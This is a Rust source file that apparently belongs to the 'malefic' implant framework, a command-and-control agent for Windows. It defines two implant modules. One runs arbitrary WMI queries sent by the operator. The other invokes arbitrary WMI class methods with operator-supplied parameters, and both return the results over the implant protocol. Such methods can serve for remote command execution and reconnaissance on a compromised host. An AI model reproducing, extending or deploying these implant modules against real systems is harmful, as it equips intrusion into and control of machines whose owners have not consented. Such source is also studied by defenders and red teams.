use std::collections::HashMap;
use crate::{Module, TaskResult, Result, Input, Output, check_request, check_field};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_helper::win::wmi::{variant_to_string_map, string_to_variant_map, WmiManager};
use malefic_proto::proto::modulepb::Response;
use malefic_trait::module_impl;


pub struct WmiQuery {}

#[async_trait]
#[module_impl("wmi_query")]
impl Module for WmiQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::WmiRequest)?;
        let cmdline = check_field!(req.args)?.join(" ");
        let manager = WmiManager::open(Some(req.namespace.as_str()))?;
        let results =  manager.execute_query(&*cmdline)?;
        let mut kv_result = HashMap::new();
        for record in results {
            let string_map = variant_to_string_map(record);
            kv_result.extend(string_map);  
        }

        Ok(TaskResult::new_with_body(id, Body::Response(Response {
            output: "".to_string(),
            error: String::new(),
            kv: kv_result,
            array: Vec::new(),
        })))
    }
}


pub struct WmiExecuteMethod {}

#[async_trait]
#[module_impl("wmi_execute")]
impl Module for WmiExecuteMethod {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        // 获取请求中的 WMI 方法调用信息
        let req = check_request!(receiver, Body::WmiMethodRequest)?;
        let class_name = check_field!(req.class_name)?;
        let method_name = check_field!(req.method_name)?;

        // 创建 WmiManager 并执行 WMI 方法
        let manager = WmiManager::open(Some(req.namespace.as_str()))?;
        let results = manager.execute_method(class_name.as_str(), method_name.as_str(), string_to_variant_map(req.params))?;
        let mut kv_result = HashMap::new();
        
        for record in results {
            let string_map = variant_to_string_map(record);
            for (key, value) in string_map {
                kv_result.insert(key.clone(), value.clone());
            }
        }

        // 返回结果
        Ok(TaskResult::new_with_body(id, Body::Response(Response {
            output: format!("Executed {}::{}", class_name, method_name),
            error: String::new(),
            kv: kv_result,
            array: Vec::new(),
        })))
    }
}

